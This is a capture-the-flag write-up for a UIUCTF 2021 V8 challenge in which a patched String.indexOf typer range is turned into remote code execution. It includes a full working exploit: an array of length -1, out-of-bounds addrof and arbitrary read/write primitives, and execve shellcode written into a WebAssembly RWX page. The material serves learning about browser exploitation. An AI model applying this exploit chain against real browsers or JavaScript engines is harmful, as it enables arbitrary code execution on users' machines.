# Should've had a v8(UIUCTF 2021)
```
Points - 464	Number of solves - 7

have fun with some v8 pwn. instructions in handout.

cat exploit.js | nc shouldve-had-a-v8.chal.uiuc.tf 1337

author: samsonites

attachments: handout.tar.gz
```
I couldn't solve this challenge during live CTF, rather did this later. Big thanks to [@n00bsh1t](https://twitter.com/n00bsh1t) who helped me a lot in understanding this. I mean A LOT!

## Patch
```diff
diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
index 899922a27f..aea23fe7ea 100644
--- a/src/compiler/js-create-lowering.cc
+++ b/src/compiler/js-create-lowering.cc
@@ -681,7 +681,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
       int capacity = static_cast<int>(length_type.Max());
       // Replace length with a constant in order to protect against a potential
       // typer bug leading to length > capacity.
-      length = jsgraph()->Constant(capacity);
+      //length = jsgraph()->Constant(capacity);
       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                             allocation, slack_tracking_prediction);
     }

diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 0f18222236..0f76ad896e 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -2073,7 +2073,7 @@ Type Typer::Visitor::TypeStringFromCodePointAt(Node* node) {
 }
 
 Type Typer::Visitor::TypeStringIndexOf(Node* node) {
-  return Type::Range(-1.0, String::kMaxLength, zone());
+  return Type::Range(0, String::kMaxLength, zone());
 }
 
 Type Typer::Visitor::TypeStringLength(Node* node) {
```
This is the important part to look at from the `diff.patch` file. The upper part contains a patch where a recently introduced Typer Hardening is disabled.
The lower part contains a typer bug. `typer.cc` file contains some ranges for functions, which are used by Turbofan(the optimizing compiler used in v8) to optimize hot functions. Here according to the patch, `indexOf()` method can return values in the range [0, kMaxLength]. While if we check this [MDN doc](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf) we can see that `str.indexOf(searchTerm)` method returns the index of first occurence of `searchTerm` if it exists inside `str`, _otherwise it returns -1._
```
The indexOf() method returns the index within the calling String object of the first occurrence of the specified value, starting the search at fromIndex. Returns -1 if the value is not found.
```
That means, this is an incorrect assumption made about the range of str.indexOf() method which we are going to exploit in this challenge to gain Arbitrary Code Execution on challenge server.

## POC
First our goal is to gain oob access.
So here is my thought process:
```js
function oob_read_opt(c) {
  const s = "AAAAA";
  let bad = s.indexOf(c);
  //Actual = -1, Range = [0, 536870888]
  bad >>= 30;
  //-1, [0, 0]
  bad *= 5;
  //-5, [0, 0]
  bad = bad + 4;
  //-1, [4, 4]
  //return bad;	--> oob_read_opt("B") returns -1
  var dummy = [1.1, 2.2, 3.3, 4.4, 5.5];
  return dummy[bad]; // oob_read_opt("B") returns undefined bcz even after optimization has been done, still bounds check isn't eliminated
}
```
Hmmm... So how do we tackle this problem. Then few articles were read and I came across [this blog](https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html) by Google Project Zero. This blog discusses similar exploitation technique and expalins in depth about whats going on. And this along with some painful debugging :') led to the following POC. This was the most and only? difficult part of the challenge.
```js
function oob_read_opt(c) {
  const s = "AAAAA";
  let bad = s.indexOf(c);
  //Actual = -1, Range = [0, 536870888]
  bad = Math.max(bad, 536870880);
  //-1, [536870880, 536870888]
  bad = bad - 536870880;
  //-536870881, [0, 8]
  bad >>= 30;
  //-1, [0, 0]
  bad *= 5;
  //-5, [0, 0]
  bad = bad + 4;
  //-1, [4, 4]
  //return bad;
  let evil = new Array(bad);
  evil[0] = 13.37;
  let obj_arr = [evil, 13.37];
  let poor = [1.1, 2.2];
  
  return [evil, poor, obj_arr];
}
```
What this does is create an array `evil` with `evil.length = -1`. 
A  brief explanation about how this works is first we have to make type reducer to convert the type representation to int32_t which is less than 32. Because when the argument to `Array()` is known to be a contant integer less than 16, then the array creation process is inlines by the compiler. You can again refer the Project Zero blog mentioned above to understand how this can be achieved. Now since the evil.length is -1, and bounds check operations are performed as unsigned integers, we can get past the bounds check and access data well beyond the array. And finally implementing the oob_access primitives.

## OOB Access
```js
/* Optimize the function oob_read_opt() */
for (i = 0; i < 0x10000; i++)  oob_read_opt("B");

[leet, noob, obj_arr] = oob_read_opt("B");

for (i = 0; i < 20 ; i++)	print(i + ":\t" + hex(ftoi(leet[i])));
```

```bash
0:	0x402abd70a3d70a3d
1:	0x7ff8000000000000
2:	0x7ff8000000000000
3:	0x7ff8000000000000
4:	0x804222d081c3a19
5:	0xfffffffe0821c88d
6:	0x408042205
7:	0x819217d0821c8b5		<-- elements of obj_arr start here
8:	0x804222d081c3a41		<-- hidden_map pointer of obj_arr
9:	0x40821c8c5			<-- elements pointer of obj_arr array
10:	0x408042a95
11:	0x3ff199999999999a		<-- elements of noob start here
12:	0x400199999999999a
13:	0x804222d081c39f1		<-- hidden_map pointer of noob array
14:	0x40821c8e5			<-- elements pointer of noob array
15:	0x608042205
16:	0x821c8fd0821c8b5
17:	0x81c3a410821c8d5
18:	0x821c90d0804222d
19:	0x81c3f6900000006
```
Now as we can see, we can use `leet` array to access and modify all the parts of `obj_arr` and `noob` array including the sensitive pointers like, hidden_map, elements pointer.
Now we simply make use of this oob_access to get general primitives for v8 exploitation:
```js
function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(leet[7]) & 0xffffffffn;
}

function heap_read(addr) {		// addr -> int32_t
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  return ftoi(noob[0]);
}

function heap_write(addr, val) {	// addr -> int32_t, val -> int64_t
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  noob[0] = itof(val);
  return;
}
```

After getting these primitives, we can either use the template provided along with the challenge files or we can do that on our own. Here is the one used by me:
```js
d = new ArrayBuffer(0x80);

print("[+]Heap leak --> *" + hex(addrof(d)) + " - 5n + 0x18n: " + hex(heap_read(addrof(d) - 5n + 0x18n)))

littleEndian = true;
bigEndian = false;

// arbitrary write primitive(not limited to just heap)
function arb_write(addr, data, littleEndian) {
  let dataview = new DataView(d);
  heap_write(addrof(d) - 5n + 0x18n, addr);
  dataview.setBigUint64(0, data, littleEndian); 
}

// execve("/bin/cat", ["/bin/cat", "/flag", NULL], NULL);
shellcode = [0x4831D25248BB2F62n, 0x696E2F6361745354n, 0x5F5248BB74000000n, 0x0000000053909090n, 0x909048BB2F666C61n, 0x672E747853545E52n, 0x5657545E4831C0B0n, 0x3B0F059090909090n];

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

shellcode_addr = heap_read(addrof(wasmInstance) - 0x8212069n + 0x82120d0n);
print("[+]RWX addrss: " + hex(shellcode_addr));

let shcode_writer = new DataView(d);
heap_write(addrof(d) - 5n + 0x18n, shellcode_addr);

print("[+]Writing shellcode...");
// Overwriting the wasm code with our shellcode to print the flag, this can be replaced depending upon base machine architecture and what we wanna execute.
for (let i = 0n ; i < shellcode.length ; i++) {
  arb_write(shellcode_addr + i*8n, BigInt(shellcode[i]), bigEndian);
}

print("[+]Printing flag...");
// Trigger the wasm code.
wasmInstance.exports.main();
```

## Final Exploit
```js
//cat exploit.js | nc shouldve-had-a-v8.chal.uiuc.tf 1337
/* -----------------------------General helper functions to convert to hex, float to int and int to double----------------------------- */
var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

function hex(val){    // input -> int, output -> hex-string
    return "0x"+val.toString(16)
}

function ftoi(val) {  // input -> float number, output -> integer
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n)
}

function itof(val) {  // input -> int, output -> float
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}

/* -----------------------------Real exploit starts here----------------------------- */
//kmaxlen = 536870888

function oob_read_opt(c) {
  const s = "AAAAA";
  let bad = s.indexOf(c);
  //Actual = -1, Range = [0, 536870888]
  bad = Math.max(bad, 536870880);
  //-1, [536870880, 536870888]
  bad = bad - 536870880;
  //-536870881, [0, 8]
  bad >>= 30;
  //-1, [0, 0]
  bad *= 5;
  //-5, [0, 0]
  bad = bad + 4;
  //-1, [4, 4]
  //return bad;
  let evil = new Array(bad);
  evil[0] = 13.37;
  let obj_arr = [evil, 1.1];  //idx 7 elemnt start
  let poor = [1.1, 2.2];
  
  return [evil, poor, obj_arr];
}

/* Optimize the function oob_read_opt() */
for (i = 0; i < 0x10000; i++)  oob_read_opt("B");

[leet, noob, obj_arr] = oob_read_opt("B");
//var float_map = ftoi(leet[13]) & 0xffffffffn
//print("[+]FLOAT_MAP: " + hex(float_map))
//for (i = 0; i < 20 ; i++) print(i + ":\t" + hex(ftoi(leet[i])));

function addrof(obj) {
  obj_arr[0] = obj;
  return ftoi(leet[7]) & 0xffffffffn;
}

function heap_read(addr) {
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  return ftoi(noob[0]);
}

function heap_write(addr, val) {
  addr |= 1n;
  addr -= 8n;
  leet[14] = itof((4n << 32n) + addr);
  noob[0] = itof(val);
  return;
}

/* -----------------------------Common shellcode writing part----------------------------- */
d = new ArrayBuffer(0x80);

//print("[+]Addr of d: " + hex(addrof(d)));
print("[+] Heap leak --> *" + hex(addrof(d)) + " - 5n + 0x18n: " + hex(heap_read(addrof(d) - 5n + 0x18n)))

littleEndian = true;
bigEndian = false;

function arb_write(addr, data, littleEndian) {
  let dataview = new DataView(d);
  heap_write(addrof(d) - 5n + 0x18n, addr);
  dataview.setBigUint64(0, data, littleEndian); 
}

shellcode = [0x4831D25248BB2F62n, 0x696E2F6361745354n, 0x5F5248BB74000000n, 0x0000000053909090n, 0x909048BB2F666C61n, 0x672E747853545E52n, 0x5657545E4831C0B0n, 0x3B0F059090909090n];
/*
0:  48 31 d2                xor    rdx,rdx
3:  52                      push   rdx
4:  48 bb 2f 62 69 6e 2f    movabs rbx,0x7461632f6e69622f   ;"/bin/cat"
b:  63 61 74
e:  53                      push   rbx
f:  54                      push   rsp
10: 5f                      pop    rdi
11: 52                      push   rdx

xx: 48 bb 74 00 00 00 00    movabs rbx,0x0000000000000074   ;"t"
xx: 00 00 00
xx: 53                      push   rbx

12: 48 bb 2f 66 6c 61 67    movabs rbx,0x78742e67616c662f   ;"/flag.tx"
19: 2e 74 78
1c: 53                      push   rbx
1d: 54                      push   rsp
1e: 5e                      pop    rsi
1f: 52                      push   rdx
20: 56                      push   rsi
21: 57                      push   rdi
22: 54                      push   rsp
23: 5e                      pop    rsi
24: 48 31 c0                xor    rax,rax
27: b0 3b                   mov    al,0x3b
29: 0f 05                   syscall               ;execve("/bin/cat", ["/bin/cat", "/flag.txt", NULL], NULL)
*/

// https://wasdk.github.io/WasmFiddle
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);

shellcode_addr = heap_read(addrof(wasmInstance) - 0x8212069n + 0x82120d0n);
print("[+] RWX addrss: " + hex(shellcode_addr));

let shcode_writer = new DataView(d);
heap_write(addrof(d) - 5n + 0x18n, shellcode_addr);

print("[+] Writing shellcode...");
for (let i = 0n ; i < shellcode.length ; i++) {
  arb_write(shellcode_addr + i*8n, BigInt(shellcode[i]), bigEndian);
}

print("[+] Printing flag...");
wasmInstance.exports.main();

// END
```
When we run this, 
```bash
$ cat exploit.js | nc shouldve-had-a-v8.chal.uiuc.tf 1337
== proof-of-work: disabled ==
[+] Heap leak --> *0x821d989 - 5n + 0x18n: 0x560325fc3c50
[+] RWX addrss: 0x17860db5d000
[+] Writing shellcode...
[+] Printing flag...
uiuctf{v8_go_brrrr_e72df103}
```
And we got the flag :)

## Resources
[In-the-Wild Series: Chrome Infinity Bug](https://googleprojectzero.blogspot.com/2021/01/in-wild-series-chrome-infinity-bug.html)

[Circumventing Chrome's hardening of typer bugs](https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs)

[Introduction to TurboFan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan)
